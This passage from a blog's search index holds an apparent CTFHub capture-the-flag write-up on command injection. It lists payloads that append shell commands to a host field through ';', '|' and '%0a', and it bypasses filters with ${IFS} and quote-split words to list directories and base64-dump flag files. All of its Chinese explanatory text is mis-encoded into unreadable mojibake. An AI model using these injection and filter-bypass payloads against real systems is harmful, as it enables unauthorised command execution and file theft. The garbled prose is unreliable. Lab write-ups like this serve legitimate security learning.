href="#è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦" class="headerlink" title="è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦"></a>è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦</h2><p><code>payloadï¼šbaidu.com | ls</code><br>å¾—åˆ°flagç›®å½•</p><p><code>payloadï¼šbaidu.com;cd flag_is_here;ls</code><br>å¾—åˆ°flagæ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶</p><p><code>payloadï¼šbaidu.com;cd flag_is_here;cat flag_4088165719730.php|base64</code><br>è§£ç å¾—åˆ°flag</p><h2 id="è¿‡æ»¤è¿ç®—ç¬¦"><a href="#è¿‡æ»¤è¿ç®—ç¬¦" class="headerlink" title="è¿‡æ»¤è¿ç®—ç¬¦"></a>è¿‡æ»¤è¿ç®—ç¬¦</h2><p>è¿‡æ»¤äº†è¿ç®—ç¬¦ï¼Œä½†æ˜¯<strong>;</strong>æ¼æ‰äº†</p><p><code>payloadï¼šbaidu.com;ls</code><br>æŸ¥çœ‹flagæ–‡ä»¶</p><p>base64 *.php &lt;=&gt;*,php|base64</p><p><code>payloadï¼šbaidu.com;base64 flag_80902931728195.php</code></p><h2 id="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "><a href="#ç»¼åˆè¿‡æ»¤ç»ƒä¹ " class="headerlink" title="ç»¼åˆè¿‡æ»¤ç»ƒä¹ "></a>ç»¼åˆè¿‡æ»¤ç»ƒä¹ </h2><p>çœ‹å®Œä»£ç å‚»çœ¼äº†ï¼Œå•¥éƒ½è¢«è¿‡æ»¤äº†ï¼Œå“~~~</p><p>çœ‹çœ‹è¿‡æ»¤ç¬”è®°å†æ¥è¯•è¯•çœ‹<br>å¯ä»¥ç”¨%0a(æ¢è¡Œç¬¦)ï¼Œä½†æ˜¯éœ€è¦åœ¨urlä¸Šä½¿ç”¨</p><p><code>payloadï¼šbaidu.com%0als</code><br>å¾—åˆ°flagç›®å½•ï¼Œç»§ç»­æ</p><p><code>payloadï¼šbaidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als</code><br>å¾—åˆ°flagæ–‡ä»¶</p><p><code>payloadï¼šbaidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php</code><br>è§£ç å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> CTFHUB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
